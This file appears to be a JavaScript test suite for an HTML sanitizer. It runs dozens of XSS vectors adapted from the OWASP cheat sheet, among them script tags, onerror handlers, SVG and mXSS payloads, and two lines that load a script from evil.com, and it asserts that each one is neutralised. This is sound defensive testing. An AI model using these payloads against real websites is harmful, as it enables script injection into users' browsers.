import test from 'node:test';
import assert from 'node:assert/strict';
import { sanitizeHtml } from '../src/index.mjs';

// Vectors from the OWASP XSS Filter Evasion Cheat Sheet, adapted as assertions
// that the sanitizer emits no executable markup and no dangerous URL.

test('raw script injection forms', () => {
  const vectors = [
    '<script>alert(1)</script>',
    '<SCRIPT>alert(1)</SCRIPT>',
    '<ScRiPt>alert(1)</sCrIpT>',
    '<script src="https://evil.com/x.js"></script>',
    '<script/src="https://evil.com/x.js">',
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<script><!--alert(1)--></script>',
    '<script>alert(1)//</script>',
  ];
  for (const vector of vectors) {
    assert.equal(sanitizeHtml(vector), '', vector);
  }
});

test('nested and broken script tags', () => {
  assert.equal(sanitizeHtml('<scr<script>ipt>alert(1)</scr</script>ipt>'), 'ipt&gt;alert(1)ipt&gt;');
  assert.equal(sanitizeHtml('<scr<script>ipt>alert(1)</script>'), 'ipt&gt;alert(1)');
  assert.equal(sanitizeHtml('<script<>>alert(1)</script>'), '');
  assert.equal(sanitizeHtml('</script><script>alert(1)</script>'), '');
});

test('img-based event handler vectors', () => {
  const vectors = [
    '<img src=x onerror=alert(1)>',
    '<IMG SRC=x ONERROR=alert(1)>',
    '<img src="x" onerror="alert(1)" />',
    '<img src=x onerror=alert&#40;1&#41;>',
    '<img src=x onerror=alert(1) onload=alert(2)>',
    '<img src=1 href=1 onerror="javascript:alert(1)">',
    '<img src=x onerror=alert(1)//>',
    '<img src="javascript:alert(1)">',
  ];
  for (const vector of vectors) {
    assert.equal(sanitizeHtml(vector), '', vector);
  }
});

test('svg and math namespace vectors are dropped completely', () => {
  const vectors = [
    '<svg/onload=alert(1)>',
    '<svg><script>alert(1)</script></svg>',
    '<svg><g/onload=alert(1)><rect width=100 height=100 /></g></svg>',
    '<svg><use href="data:image/svg+xml;base64,PHN2Zz4=" /></svg>',
    '<svg><animate attributeName=href values=javascript:alert(1) /></svg>',
    '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
    '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
    '<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>',
  ];
  for (const vector of vectors) {
    assert.equal(sanitizeHtml(vector), '', vector);
  }
});

test('mXSS vectors involving noscript, template and comments', () => {
  const vectors = [
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">x</p></noscript><!--mXSS-->',
    '<template><img src=x onerror=alert(1)></template>',
    '<template><script>alert(1)</script></template>',
    '<!--><img src=x onerror=alert(1)>-->',
    '<!--<script>alert(1)</script>--><p>ok</p>',
    '<![CDATA[<img src=x onerror=alert(1)>]]>',
    '<textarea><img src=x onerror=alert(1)></textarea>',
    '<xmp><img src=x onerror=alert(1)></xmp>',
    '<noembed><img src=x onerror=alert(1)></noembed>',
    '<noframes><img src=x onerror=alert(1)></noframes>',
  ];
  for (const vector of vectors) {
    const out = sanitizeHtml(vector);
    assert.doesNotMatch(out, /<script\b|<img\b/i, vector);
  }
});

test('entity-encoded markup is escaped, never re-parsed', () => {
  assert.equal(sanitizeHtml('&lt;script&gt;alert(1)&lt;/script&gt;'),
    '&lt;script&gt;alert(1)&lt;/script&gt;');
  assert.equal(sanitizeHtml('&lt;img src=x onerror=alert(1)&gt;'),
    '&lt;img src=x onerror=alert(1)&gt;');
  assert.equal(sanitizeHtml('<p>&amp;lt;script&amp;gt;</p>'), '<p>&amp;lt;script&amp;gt;</p>');
});

test('DOM clobbering vectors', () => {
  assert.equal(sanitizeHtml('<a id=location href=/x>x</a>'), '<a href="/x">x</a>');
  assert.equal(sanitizeHtml('<form id=document><input name=cookie></form>'), '');
  assert.equal(sanitizeHtml('<img name=body src=x onerror=alert(1)>'), '');
  assert.equal(sanitizeHtml('<div id="document.body">x</div>'), '<div>x</div>');
});

test('unclosed tag and malformed markup vectors', () => {
  assert.equal(sanitizeHtml('<img src=x onerror=alert(1)'), '');
  assert.equal(sanitizeHtml('<script>alert(1)'), '');
  assert.equal(sanitizeHtml('<svg/onload=alert(1)'), '');
  assert.equal(sanitizeHtml('<a href="javascript:alert(1)"'), '<a></a>');
  assert.equal(sanitizeHtml('<<img src=x onerror=alert(1)>'), '&lt;<img src=x onerror=alert(1)>'.replace('<img src=x onerror=alert(1)>', ''));
});

test('charset and encoding evasion vectors', () => {
  assert.equal(sanitizeHtml('<p>&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;</p>'),
    '<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>');
  assert.equal(sanitizeHtml('<a href="&#x6A;avascript:alert(1)">x</a>'), '<a>x</a>');
  assert.equal(sanitizeHtml('<a href="javascript&#58;alert(1)">x</a>'), '<a>x</a>');
  assert.equal(sanitizeHtml('<p>&#0000060;script&#0000062;</p>'), '<p>&lt;script&gt;</p>');
});
